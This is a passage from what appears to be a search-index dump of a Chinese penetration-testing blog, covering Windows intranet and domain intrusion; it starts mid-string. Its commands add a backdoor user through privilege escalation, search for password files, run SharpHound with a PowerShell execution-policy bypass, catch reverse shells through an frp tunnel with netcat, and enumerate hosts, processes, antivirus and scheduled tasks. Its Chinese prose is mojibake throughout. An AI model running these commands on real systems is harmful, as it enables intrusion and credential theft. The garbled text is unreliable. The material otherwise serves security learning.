'/c net user evi1cg test123 /add'\"\n```\n\nè¿™æ ·æ‰§è¡Œçš„è¯å°±ä¸ä¼šæç¤ºéœ€è¦æƒé™å¹¶ä¸”å‘½ä»¤ä¹Ÿèƒ½æ­£å¸¸æ‰§è¡Œï¼Œè¿™è¿˜æœ‰ä¸ªå°å‘ï¼Œå°±æ˜¯åœ¨adduserçš„æ—¶å€™ä¸€å®šè¦ä¿è¯å¯†ç æ˜¯èƒ½é€šè¿‡å®‰å…¨æ€§éªŒè¯çš„ï¼Œä¸ç„¶æ²¡æœ‰æ–°ç”¨æˆ·ç”Ÿæˆå¾ˆå®¹æ˜“è¯¯è®¤ä¸ºææƒå¤±è´¥\n\næˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œæœ¨é©¬æ–‡ä»¶ï¼Œè¿™æ ·åå¼¹çš„shellå°±æ˜¯SYSTEMç”¨æˆ·æƒé™äº†\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202320685.png)\n\n### æœ¬åœ°ææƒæ¼æ´\n\n#### CVE-2020-0787\n\nå½“WindowsèƒŒæ™¯æ™ºèƒ½ä¼ è¾“æœåŠ¡ï¼ˆBITSï¼‰æ²¡æœ‰æ­£ç¡®å¤„ç†ç¬¦å·é“¾æ¥æ—¶ï¼Œå­˜åœ¨ç‰¹æƒæå‡æ¼æ´ï¼Œåˆ©ç”¨åæ”»å‡»è€…å¯ä»¥æ”¹å†™ç›®æ ‡æ–‡ä»¶æ¥æå‡æƒé™ï¼Œåˆ©ç”¨æ¡ä»¶å°±æ˜¯æ”»å‡»è€…éœ€è¦ç™»å½•ç³»ç»Ÿï¼Œå¯ä»¥è¿è¡ŒEXP\n\nè¯¥æ¼æ´å½±å“çš„ç‰ˆæœ¬ï¼šWindows7 SP1-Windows10 1903æ‰€æœ‰æ¶æ„\n\nåœ¨åˆ©ç”¨æ—¶æˆ‘ä»¬è¦å…ˆçœ‹ç›®æ ‡æœºå™¨æ˜¯å¦æœ‰å¯¹åº”æ¼æ´è¡¥ä¸\n\n```\nsysteminfo | findstr KB4540673\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202332882.png)\n\nå¾ˆå¥½ï¼Œæ²¡æœ‰å¯¹åº”çš„è¡¥ä¸ï¼Œæˆ‘ä»¬ç›´æ¥åˆ©ç”¨å¯¹åº”çš„EXPï¼Œä¸Šä¼ åæ‰§è¡Œï¼ˆmlgbdä¸ºä»€ä¹ˆä¸å¼¹ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼‰\n\n\n\n\n\n### æ•°æ®åº“ææƒ\n\n\n\n\n\n\n\n\n\n"},{"title":"Windowså†…ç½‘åŸŸæ¸—é€3","url":"/posts/d114db98.html","content":"\n# ä½æƒé™æœé›†æœ¬æœºå¯†ç æ–‡ä»¶\n\n- **dirå‘½ä»¤æœé›†å½“å‰æœºå™¨å„ç±»å¯†ç é…ç½®æ–‡ä»¶**\n\n  ä¸€èˆ¬é…ç½®æˆ–å¯†ç æ–‡ä»¶éƒ½æ˜¯ï¼š\n\n  ```\n  pass.*,config.*,username.*,password.*\n  ```\n\n  å¯ä»¥ç›´æ¥ä½¿ç”¨dirå‘½ä»¤è¿›è¡Œæœé›†ï¼Œå»ºè®®ä¸è¦ä»Cç›˜æ‰«ï¼Œä»userç›®å½•ä¸‹æ‰«æ\n\n  ```cmd\n  dir /b /s user.*,pass.*,config.*,username.*,password.*\n  ```\n\n  æˆ‘ä»¬cdåˆ°ç›®æ ‡ç›®å½•åç›´æ¥æ‰§è¡Œï¼Œå‘ç°å¯†ç æ–‡ä»¶ï¼š\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210192105452.png)\n\n  æˆ‘ä»¬ç›´æ¥æŸ¥çœ‹\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210192107139.png)\n\n- **forå¾ªç¯æœé›†å½“å‰æœºå™¨å„ç±»æ•æ„Ÿå¯†ç çš„é…ç½®æ–‡ä»¶**\n\n  ```cmd\n  for /r C:\\ %i in (pass.*) do @echo %i\n  ```\n\n  è¿™ä¸ªè€—æ—¶æ¯”è¾ƒä¹…ï¼Œæˆ‘ä»¬éœ€è¦ç¨ç­‰å†æŸ¥çœ‹ï¼Œæœ€ç»ˆç»“æœå’Œä¸Šé¢çš„dirå‘½ä»¤æ˜¯ç›¸ä¼¼çš„\n\n- **findstrå‘½ä»¤æŸ¥æ‰¾æ–‡ä»¶ä¸­çš„å­—æ®µ**\n\n  ```cmdÂ \n  findstr /c:\"user\" /c:\"pass\" /si *.txt\n  ```\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210192112055.png)\n\n\n\n\n\n\n\n"},{"title":"Windowså†…ç½‘åŸŸæ¸—é€2","url":"/posts/a613eb0e.html","content":"\n# BloodHoundä½¿ç”¨\n\nå®‰è£…ç•¥è¿‡ï¼Œç™¾åº¦éƒ½æœ‰\n\né¦–å…ˆéœ€è¦å»å®˜æ–¹çš„Githubé¡¹ç›®ä¸­ä¸‹è½½æ”¶é›†å™¨ï¼Œæ³¨æ„è¿™ä¸ªç©æ„éœ€è¦.net 4.7ä»¥ä¸Šçš„è¿è¡Œç¯å¢ƒçš„ï¼Œä¸ç„¶ç›´æ¥å¼¹çª—ç»™ä½ çœ‹\n\n```powershell\n#exeå‘½ä»¤\nSharpHound.exe -c all\n#powershellå‘½ä»¤\npowershell -exec bypass -command \"Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all\"\n```\n\n## å‰ç½®çŸ¥è¯†\n\n### å…³äºèº«ä»½è®¤è¯æ–¹å¼\n\n#### kerberosè®¤è¯\n\n- **ç®€ä»‹**\n\n  Kerberosåè®®æ˜¯ä¸€ä¸ªä¸“æ³¨äºéªŒè¯é€šä¿¡åŒæ–¹èº«ä»½çš„ç½‘ç»œåè®®ï¼Œä¸åŒäºå…¶ä»–ç½‘ç»œå®‰å…¨åè®®çš„ä¿è¯æ•´ä¸ªé€šä¿¡è¿‡ç¨‹çš„ä¼ è¾“å®‰å…¨ï¼Œkerberosä¾§é‡äºé€šä¿¡å‰åŒæ–¹èº«ä»½çš„è®¤å®šå·¥ä½œï¼Œå¸®åŠ©å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯è§£å†³â€œè¯æ˜æˆ‘è‡ªå·±æ˜¯æˆ‘è‡ªå·±â€çš„é—®é¢˜ï¼Œä»è€Œä½¿å¾—é€šä¿¡ä¸¤ç«¯èƒ½å¤Ÿå®Œå…¨ä¿¡ä»»å¯¹æ–¹èº«ä»½ï¼Œåœ¨ä¸€ä¸ªä¸å®‰å…¨çš„ç½‘ç»œä¸­å®Œæˆä¸€æ¬¡å®‰å…¨çš„èº«ä»½è®¤è¯ç»§è€Œè¿›è¡Œå®‰å…¨çš„é€šä¿¡ã€‚\n\n- **ç»„æˆè§’è‰²**\n\n  **å®¢æˆ·ç«¯ï¼ˆclientï¼‰**ï¼šå‘é€è¯·æ±‚çš„ä¸€æ–¹\n\n  **æœåŠ¡ç«¯ï¼ˆServerï¼‰**ï¼šæ¥æ”¶è¯·æ±‚çš„ä¸€æ–¹\n\n  **å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKey Distribution Centerï¼ŒKDCï¼‰**ï¼Œè€Œå¯†é’¥åˆ†å‘ä¸­å¿ƒä¸€èˆ¬åˆåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯ï¼š \n\n  - **ASï¼ˆAuthentication Serverï¼‰**ï¼šè®¤è¯æœåŠ¡å™¨ï¼Œä¸“é—¨ç”¨æ¥è®¤è¯å®¢æˆ·ç«¯çš„èº«ä»½å¹¶å‘æ”¾å®¢æˆ·ç”¨äºè®¿é—®TGSçš„TGTï¼ˆç¥¨æ®æˆäºˆç¥¨æ®ï¼‰ \n  - **TGSï¼ˆTicket Granting Ticketï¼‰**ï¼šç¥¨æ®æˆäºˆæœåŠ¡å™¨ï¼Œç”¨æ¥å‘æ”¾æ•´ä¸ªè®¤è¯è¿‡ç¨‹ä»¥åŠå®¢æˆ·ç«¯è®¿é—®æœåŠ¡ç«¯æ—¶æ‰€éœ€çš„æœåŠ¡æˆäºˆç¥¨æ®ï¼ˆTicketï¼‰\n\n  åœ¨æ•´ä¸ªkerberosè®¤è¯è¿‡ç¨‹ä¸­ï¼Œä¸‰ä¸ªè§’è‰²ç¼ºä¸€ä¸å¯\n\n- **åŸç†**\n\n  ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬ç†è§£ï¼Œæˆ‘ä»¬å…ˆå‡è®¾è¿™ä¹ˆä¸€ä¸ªåœºæ™¯ï¼Œç°åœ¨æœ‰ABCä¸‰äººï¼ŒAéœ€è¦å»æ‰¾Bå®Œæˆä¸€ä»¶äº‹æƒ…ï¼Œä½†æ˜¯å½¼æ­¤å¹¶æ²¡æœ‰è§è¿‡é¢ï¼ŒåªçŸ¥é“å¯¹æ–¹çš„åå­—ï¼Œé‚£å¦‚æœAç›´æ¥å»æ‰¾Bï¼ŒAå°±æ²¡æœ‰åŠæ³•å‘Bç›´æ¥è¯æ˜è‡ªå·±å°±æ˜¯Aï¼Œæ‰€ä»¥ç°åœ¨ä»–ä»¬æ‰¾åˆ°äº†å½¼æ­¤éƒ½è®¤è¯†å¹¶ä¸”ä¿¡ä»»çš„Cï¼Œè®©Cç»™Aä¸€ä¸ªå‡­è¯ï¼Œç”±Aäº¤ç»™Bå»æ‰¾Cæ¥éªŒè¯èº«ä»½ï¼Œè¿™æ—¶Aå°±èƒ½éªŒè¯è‡ªå·±çš„èº«ä»½äº†\n\n  ä¸Šé¢è¿™ä¸ªä¾‹å­å°±å¾ˆå¥½çš„è¯´æ˜äº†kerberosè®¤è¯çš„æ–¹å¼ï¼ŒAç›¸å½“äºå®¢æˆ·ç«¯ï¼ŒBç›¸å½“äºæœåŠ¡ç«¯ï¼ŒCç›¸å½“äºKDCï¼ŒKDCä¸­åŒ…å«ä¸€ä¸ªå«åšTGSï¼ˆç¥¨æ®æˆäºˆä¸­å¿ƒï¼‰çš„ç»„ä»¶ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ç†è§£ä¸ºä»–å°±æ˜¯ä¸€ä¸ªå‘æ”¾èº«ä»½è®¤è¯ç¥¨æ®çš„æœåŠ¡ä¸­å¿ƒï¼Œåœ¨KDCè®¤è¯äº†ï¼ˆå…¶å®æ˜¯KDCä¸­çš„ASè®¤è¯çš„ï¼‰å®¢æˆ·ç«¯çš„èº«ä»½åï¼Œä»–ä¼šç»™å®¢æˆ·ç«¯å‘æ”¾ç”¨äºè®¿é—®ç½‘ç»œæœåŠ¡çš„æœåŠ¡æˆäºˆç¥¨æ®ï¼ˆTicketï¼‰ã€‚ç”±äºæ•´ä¸ªkerberosé€šä¿¡è¿‡ç¨‹éƒ½é‡‡ç”¨å¯¹ç§°åŠ å¯†çš„æ–¹å¼ï¼Œå¯†é’¥çš„è·å–ä¹Ÿæ˜¯ä»KDCä¸­å¾—åˆ°ï¼Œæ‰€ä»¥KDCå«åšå¯†é’¥åˆ†å‘ä¸­å¿ƒã€‚ \n\n- **æµç¨‹**\n\n  ä¸Šé¢çš„åŸç†ææ˜ç™½äº†ä¹Ÿå°±å¾ˆå®¹æ˜“çŸ¥é“æµç¨‹äº†ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜éœ€è¦è§£å†³ä¸¤ä¸ªé—®é¢˜\n\n  **é—®é¢˜1** KDCæ€ä¹ˆçŸ¥é“ä½ ï¼ˆå®¢æˆ·ç«¯ï¼‰å°±æ˜¯çœŸæ­£çš„å®¢æˆ·ç«¯ï¼Ÿå‡­ä»€ä¹ˆç»™ä½ å‘æ”¾æœåŠ¡æˆäºˆç¥¨æ®ï¼ˆTicketï¼‰å‘¢ï¼Ÿ\n\n  **é—®é¢˜2** æœåŠ¡ç«¯æ€ä¹ˆçŸ¥é“ä½ å¸¦æ¥çš„æœåŠ¡æˆäºˆç¥¨æ®ï¼ˆTicketï¼‰å°±æ˜¯ä¸€å¼ çœŸæ­£çš„ç¥¨æ®å‘¢ï¼Ÿ\n\n  æ‰€ä»¥è¯´ä¸Šé¢çš„åŸç†åªæ˜¯ä¸€ä¸ªç®€åŒ–åçš„æ¨¡å‹ï¼Œå®é™…ä¸Šçš„ä¸€æ¬¡å®Œæ•´çš„kerberosè®¤è¯æ€»å…±éœ€è¦ä¸‰æ¬¡é€šä¿¡\n\n  1. å®¢æˆ·ç«¯é¦–å…ˆéœ€è¦æ¥åˆ°KDCè·å¾—æœåŠ¡æˆäºˆç¥¨æ®ï¼ˆTicketï¼‰ã€‚ç”±äºå®¢æˆ·ç«¯æ˜¯ç¬¬ä¸€æ¬¡è®¿é—®KDCï¼Œæ­¤æ—¶KDCä¹Ÿä¸ç¡®å®šè¯¥å®¢æˆ·ç«¯çš„èº«ä»½ï¼Œæ‰€ä»¥**ç¬¬ä¸€æ¬¡é€šä¿¡çš„ç›®çš„ä¸ºKDCè®¤è¯å®¢æˆ·ç«¯èº«ä»½ï¼Œç¡®è®¤å®¢æˆ·ç«¯æ˜¯ä¸€ä¸ªå¯é ä¸”æ‹¥æœ‰è®¿é—®KDCæƒé™çš„å®¢æˆ·ç«¯**\n  2. å®¢æˆ·ç«¯ä¼šç”¨è‡ªå·±çš„å¯†é’¥å°†ç¬¬äºŒéƒ¨åˆ†å†…å®¹è¿›è¡Œè§£å¯†ï¼Œåˆ†åˆ«è·å¾—æ—¶é—´æˆ³ï¼Œè‡ªå·±å°†è¦è®¿é—®çš„TGSçš„ä¿¡æ¯ï¼Œå’Œç”¨äºä¸TGSé€šä¿¡æ—¶çš„å¯†é’¥CT_SKã€‚é¦–å…ˆä»–ä¼šæ ¹æ®æ—¶é—´æˆ³åˆ¤æ–­è¯¥æ—¶é—´æˆ³ä¸è‡ªå·±å‘é€è¯·æ±‚æ—¶çš„æ—¶é—´ä¹‹é—´çš„å·®å€¼æ˜¯å¦å¤§äº5åˆ†é’Ÿï¼Œå¦‚æœå¤§äºäº”åˆ†é’Ÿåˆ™è®¤ä¸ºè¯¥ASæ˜¯ä¼ªé€ çš„ï¼Œè®¤è¯è‡³æ­¤å¤±è´¥ã€‚å¦‚æœæ—¶é—´æˆ³åˆç†ï¼Œå®¢æˆ·ç«¯ä¾¿å‡†å¤‡å‘TGSå‘èµ·è¯·æ±‚ï¼Œ\n  3. æ­¤æ—¶çš„å®¢æˆ·ç«¯æ”¶åˆ°äº†æ¥è‡ªKDCï¼ˆTGSï¼‰çš„å“åº”ï¼Œå¹¶ä½¿ç”¨ç¼“å­˜åœ¨æœ¬åœ°çš„CT_SKè§£å¯†äº†ç¬¬äºŒéƒ¨åˆ†å†…å®¹ï¼ˆç¬¬ä¸€éƒ¨åˆ†å†…å®¹ä¸­çš„STæ˜¯ç”±Serverå¯†ç åŠ å¯†çš„ï¼Œå®¢æˆ·ç«¯æ— æ³•è§£å¯†ï¼‰ï¼Œæ£€æŸ¥æ—¶é—´æˆ³æ— è¯¯åå–å‡ºå…¶ä¸­çš„CS_SKå‡†å¤‡å‘æœåŠ¡ç«¯å‘èµ·æœ€åçš„è¯·æ±‚ã€‚\n\n  äº†è§£åˆ°è¿™äº›å†çœ‹è€åºçš„å›¾\n\n  ![image-20221010113610118](https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20221010113610118.png)\n\n  ![image-20221010113606949](https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20221010113606949.png)\n\n  ![62638be70e3e745194dca594](https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/62638be70e3e745194dca594.png)\n\n#### NTLMè®¤è¯\n\næœ¬åœ°å¯†ç å“ˆå¸Œï¼Œæ²¡äº†\n\n## BloodHoundæ¿å—\n\n1. Database Infoï¼ˆæ•°æ®åº“ä¿¡æ¯ï¼‰ï¼Œå¯æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­çš„åŸŸç”¨æˆ·ï¼ŒåŸŸè®¡ç®—æœºç­‰ç»Ÿè®¡ä¿¡æ¯\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210182041355.png)\n\n2. Node Infoï¼ˆèŠ‚ç‚¹ä¿¡æ¯ï¼‰ï¼Œå•å‡»æŸä¸ªèŠ‚ç‚¹æ—¶ï¼Œå¯ä»¥çœ‹åˆ°å¯¹åº”èŠ‚ç‚¹çš„è¯¦ç»†ä¿¡æ¯\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210182045362.png)\n\n3. Analysisï¼ˆåˆ†ææŸ¥è¯¢ï¼‰æä¾›äº†ä¸€äº›é¢„è®¾å¥½çš„æŸ¥è¯¢è¯­å¥\n\n- **Find all Domain Admins**ï¼ˆæŸ¥è¯¢æ‰€æœ‰åŸŸç®¡ç†å‘˜ï¼‰\n- **Find Shortest Paths to Domain Admins**ï¼ˆæ‰¾å‡ºåŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„ï¼‰\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\néƒ¨åˆ†å†…å®¹å¼•ç”¨ä»¥ä¸‹æ–‡ç« ï¼š\n\n[è¯¦è§£kerberosè®¤è¯åŸç†](https://seevae.github.io/2020/09/12/è¯¦è§£kerberosè®¤è¯æµç¨‹/)\n"},{"title":"æ— å…¬ç½‘æœåŠ¡å™¨åå¼¹shell","url":"/posts/23df454a.html","content":"\n1. ç”¨SakuraFrpï¼ˆå› ä¸ºå…è´¹ï¼‰ï¼Œhttps://www.natfrp.com/user/\n\n2. åœ¨**ç©¿é€â€”éš§é“**ä¸­å¼€å¯ä¸€ä¸ªæ–°çš„éš§é“ï¼Œæœ¬åœ°ç«¯å£å¯ä»»æ„è®¾å®šï¼Œæœ¬åœ°ç«¯å£å³ä¸ºç¨åç”µè„‘è¦ç›‘å¬çš„ç«¯å£\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171924171.png)\n\n3. ä¸‹è½½SakuraFrpçš„å®˜æ–¹è½¯ä»¶ï¼Œè¿è¡Œï¼Œåœ¨ä¸ªäººä¸­å¿ƒä¸­æ‰¾åˆ°tokenå¹¶å¡«å…¥\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171948612.png)\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171949150.png)\n\n   å¦‚å›¾æ‰€ç¤ºè¯´æ˜éš§é“å·²å¼€å¯\n\n4. å¦èµ·ä¸€ä¸ªshellç«¯å£ï¼Œç›‘å¬ä¹‹å‰è®¾ç½®è¿‡çš„ç«¯å£\n\n   `nc -lvp è®¾ç½®çš„ç«¯å£`\n\n5. ç”¨æ‰§è¡Œå‘½ä»¤åæç¤ºçš„IPæˆ–åŸŸåæ¥ç”Ÿæˆåå¼¹shellå‘½ä»¤\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171952293.png)\n\n6. æ‰§è¡ŒåæˆåŠŸå¼¹shell\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171952765.png)\n"},{"title":"Windowså†…ç½‘åŸŸæ¸—é€","url":"/posts/a0d619b1.html","content":"\n# Windowså†…ç½‘åŸŸæ¸—é€\n\n## åŸŸæ£®æ—ä¸‹çš„å†…ç½‘ä¿¡æ¯æœé›†\n\nåœ¨æˆ‘ä»¬è¿›è¡Œæ¸—é€æµ‹è¯•è¿›å…¥å†…ç½‘åï¼Œé¢å¯¹çš„æ˜¯ä¸€ç‰‡é»‘æš—ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆåº”å½“åšçš„å°±æ˜¯å¯¹å½“å‰æ‰€å¤„çš„ç½‘ç»œç¯å¢ƒè¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼Œé€šå¸¸åˆ†ä¸ºä¸‰ç§åˆ¤æ–­\n\n- æˆ‘æ˜¯è°â€”â€”â€”â€”å¯¹æœºå™¨è§’è‰²åˆ¤æ–­\n- è¿™æ˜¯å“ªâ€”â€”â€”â€”å¯¹ç›®å‰æœºå™¨æ‰€å¤„çš„ç½‘ç»œç¯å¢ƒçš„æ‹“æ‰‘ç»“æ„è¿›è¡Œåˆ†æå’Œåˆ¤æ–­\n- æˆ‘åœ¨å“ªâ€”â€”â€”â€”å¯¹ç›®å‰æœºå™¨æ‰€å¤„çš„ä½ç½®åŒºåŸŸè¿›è¡Œåˆ¤æ–­\n\næ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹ç›®æ ‡å†…ç½‘è¿›è¡Œä¿¡æ¯æœé›†ï¼Œæœé›†çš„è¶Šå¤šå¯¹å†…ç½‘è¶Šäº†è§£æ‰èƒ½åœ¨æ¸—é€ä¸­å¦‚é±¼å¾—æ°´\n\né‚£å‡è®¾æˆ‘ä»¬ç°åœ¨å·²ç»è·å–åˆ°**darkflow.com**åŸŸä¸­çš„**web-2021**æœºå™¨çš„æ§åˆ¶æƒé™ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•ä½¿ç”¨CSæ¥è¿›è¡Œå†…ç½‘ä¿¡æ¯æœé›†\n\n### æ˜¯å¦åœ¨åŸŸä¸­\n\nåœ¨å¯¹Windowsè¿›è¡Œå†…ç½‘æ¸—é€çš„æ—¶å€™ï¼Œé’ˆå¯¹åŸŸç¯å¢ƒå’Œå·¥ä½œç»„ç¯å¢ƒæ‰€è¿›è¡Œçš„æ¸—é€æ–¹å¼æ˜¯å®Œå…¨ä¸åŒçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”å½“å…ˆåˆ¤æ–­ä¸»æœºäº‹éƒ½åœ¨åŸŸä¸­ï¼Œæ­¤å¤„æœ‰ä¸¤ç§æ–¹å¼\n\n1. ä½¿ç”¨`ipconfig /all`æŸ¥çœ‹å½“å‰ç½‘å¡å’ŒIPä¿¡æ¯\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210122203724.png)\n\n   å¯ä»¥çœ‹åˆ°å‘½ä»¤æ‰§è¡Œä¹‹ååœ¨IPé…ç½®æ±‡æ€»å­˜åœ¨ä¸»DNSåç¼€ï¼Œè¿™ä»£è¡¨æˆ‘ä»¬å­˜åœ¨åœ¨åŸŸç¯å¢ƒä¸­ï¼Œåä¹‹åˆ™æ˜¯å·¥ä½œç»„ç¯å¢ƒ\n\n2. ä½¿ç”¨`systeminfo`æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210122205249.png)\n\n   æ­¤å¤„ä¸­åŸŸæ˜¾ç¤ºä¸ºä¸€ä¸ªåŸŸåï¼Œè€Œå¦‚æœæ˜¯å·¥ä½œç»„åˆ™ä¼šæ˜¾ç¤ºWORKGROUP\n\n3. ä½¿ç”¨`net config workstation`æŸ¥çœ‹å½“å‰ç™»å½•åŸŸä»¥åŠç”¨æˆ·\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210132335431.png)\n\n   å¯ä»¥çœ‹åˆ°å…¶ä¸­æœ‰å·¥ä½œç«™åŸŸå¹¶ä¸”ä¸æ˜¯WORKGROUP\n\n4. ä½¿ç”¨`net time /domain`æ¥æŸ¥çœ‹ç³»ç»Ÿæ—¶é—´ï¼Œå…¶ä¸­çš„`/domain`å‚æ•°ä»£è¡¨å…¶åªèƒ½åœ¨åŸŸç¯å¢ƒä¸­æ‰§è¡Œ\n\n   è¯¥å‘½ä»¤æ‰§è¡Œåæœ‰ä¸‰ç§æƒ…å†µ\n\n   - å­˜åœ¨åŸŸä½†å½“å‰ç”¨æˆ·å¹¶éåŸŸå†…ç”¨æˆ·ï¼š`å‘ç”Ÿç³»ç»Ÿé”™è¯¯ï¼Œæ‹’ç»è®¿é—®`\n   - å­˜åœ¨åŸŸå¹¶ä¸”å½“å‰ç”¨æˆ·æ˜¯åŸŸå†…ç”¨æˆ·ï¼šæ˜¾ç¤ºåŸŸä»¥åŠæ—¶é—´\n   - ä¸å­˜åœ¨åŸŸï¼šæ‰¾ä¸åˆ°WORKGROUPçš„åŸŸæ§åˆ¶å™¨\n\n### æœ¬æœºä¿¡æ¯æœé›†\n\nåœ¨åˆ†è¾¨å¥½æˆ‘ä»¬æ˜¯åœ¨åŸŸä¸­è¿˜æ˜¯å·¥ä½œç»„åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹å½“å‰æœºå™¨è¿›è¡Œä¿¡æ¯æœé›†äº†\n\n- **è·å–æœ¬æœºç½‘ç»œé…ç½®ä¿¡æ¯**ï¼š`ipconfig /all`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210132346666.png)\n\n  ç”¨æ¥åˆ†æç½‘ç»œæ‹“æ‰‘ï¼Œå¦‚æœæœºå™¨åœ¨å†…ç½‘ä¸­æˆ‘ä»¬å°±å¯ä»¥æ‰©å¤§èŒƒå›´è¿›è¡Œå†…ç½‘çš„æ¨ªå‘æ¸—é€ï¼Œæ‹¿ä¸‹æ›´å¤šèµ„äº§\n\n- **æŸ¥è¯¢æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯**ï¼š`systeminfo | findstr /B /C:\"OS\"`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210132345103.png)\n\n  å¯ä»¥äº†è§£åˆ°æœ¬æœºçš„ç³»ç»Ÿç‰ˆæœ¬ï¼Œåœ¨æˆ‘ä»¬æƒ³è¦è¿›è¡Œææƒçš„æ—¶å€™æˆ‘ä»¬å¯ä»¥é’ˆå¯¹æ€§çš„å¯»æ‰¾å¯¹åº”çš„exp\n\n- **æŸ¥çœ‹æœ¬æœºå·²å®‰è£…çš„è½¯ä»¶åŠç‰ˆæœ¬ï¼Œè·¯å¾„**ï¼š`wmic product get name,version`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210140055450.png)\n\n  é€šè¿‡æœé›†å·²å®‰è£…çš„è½¯ä»¶ä¿¡æ¯ï¼Œå¯ä»¥é’ˆå¯¹æŸæ¬¾è½¯ä»¶çš„æ¼æ´æ¥è¿›è¡Œä¸€äº›ææƒç­‰æ“ä½œ\n\n- **æŸ¥çœ‹æœ¬æœºè¿›ç¨‹ä¿¡æ¯**ï¼š`tasklist /v`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210140100985.png)\n\n  é€šè¿‡è¯¥å‘½ä»¤æŸ¥è¯¢çš„ç³»ç»Ÿè¿›ç¨‹ä¿¡æ¯å¯æ˜¾ç¤ºå‡ºè¿›ç¨‹çš„è¿è¡Œç”¨æˆ·ï¼ˆSYSTEMç”¨æˆ·æƒé™ä»¥ä¸‹ï¼‰åŠç›®å½•ï¼Œåœ¨åæœŸæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¤ç‰Œçªƒå–æ¥è¿›è¡Œæå–\n\n- **æ€æ¯’è½¯ä»¶è¿›ç¨‹æŸ¥çœ‹**ï¼š`tasklist /SVC`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141410006.png)\n\n  å°†è¯¥å‘½ä»¤çš„è¿”å›å€¼æäº¤å¯¹åº”çš„[æŸ¥è¯¢ç½‘ç«™](https://www.adminxe.com/CompareAV/index.php)å³å¯æŸ¥çœ‹æ˜¯å¦æœ‰æ€æ¯’è½¯ä»¶ï¼Œæ–¹ä¾¿æˆ‘ä»¬ä¸æ€è½¯å¯¹æŠ—\n\n- **å¯åŠ¨ç¨‹åºä¿¡æ¯**ï¼š`wmic startup get command,caption`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141421601.png)\n\n  å¯ä»¥çœ‹åˆ°è¯¦ç»†çš„å¯åŠ¨é¡¹å‘½ä»¤åŠæè¿°\n\n- **æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡**ï¼š`schtasks /query /fo LIST /v`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141535865.png)\n\n  é€šè¿‡æŸ¥çœ‹æœ¬æœºè®¡åˆ’ä»»åŠ¡å¯ä»¥åˆ©ç”¨å®šæ—¶ä»»åŠ¡æ¥åšå®šæ—¶ä»»åŠ¡åŠ«æŒ\n\n- **æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´**ï¼š`net statistics workstation`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141538799.png)\n\n  å¯ä»¥é€šè¿‡æŸ¥çœ‹å¼€æœºæ—¶é—´æ¥åˆ¤æ–­æ˜¯å¦ç»å¸¸æœ‰äººç®¡ç†ä½¿ç”¨è¿™å°æœºå™¨\n\n- **æŸ¥çœ‹ç”¨æˆ·**ï¼š`net user` `net user æ‰§è¡Œç”¨æˆ·`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141602726.png)\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141604248.png)\n\n  æ²¡å•¥å¥½è¯´çš„ï¼Œå°±æ˜¯æŸ¥çœ‹ç”¨æˆ·ï¼Œè¿˜å¯ä»¥æŸ¥çœ‹æŒ‡å®šç”¨æˆ·å±äºçš„ç»„\n\n- **æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·**ï¼š`query user || qwinsta`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141610279.png)\n\n  